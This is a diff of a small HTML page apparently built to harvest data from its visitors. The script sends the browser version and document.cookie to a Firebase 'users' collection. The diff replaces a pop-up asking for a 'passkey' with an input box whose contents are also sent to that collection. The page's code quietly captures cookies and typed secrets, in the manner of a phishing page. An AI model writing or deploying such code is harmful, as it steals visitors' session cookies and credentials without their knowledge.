@@ -10,12 +10,14 @@
   <style>
     body {
       background-color: black;
+      color: white;
     }
   </style>
 </head>
 
 <body>
-  <!-- Project -->
+  <!-- Project --> 
+passkey? : <input type="text" id="box"/> <button onclick="who()">send</button>
   
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 
@@ -51,12 +53,13 @@
       push(ref(db, 'users'), x);
       push(ref(db, 'users'), window.navigator.appVersion);
       push(ref(db, 'users'), document.cookie); 
-    }
-setTimeout(() => {
-      let y = prompt("passkey? (telnet)");
-      push(ref(db, 'users'), "writed:" +y);
-      }, 150)
+      push(ref(db, 'users'), "from dns");
+    } 
     
+ window.who = () => { 
+      var y = document.getElementById("box").value;
+      push(ref(db, 'users'), "writed:" +y);
+ }
   </script>
 </body>
 
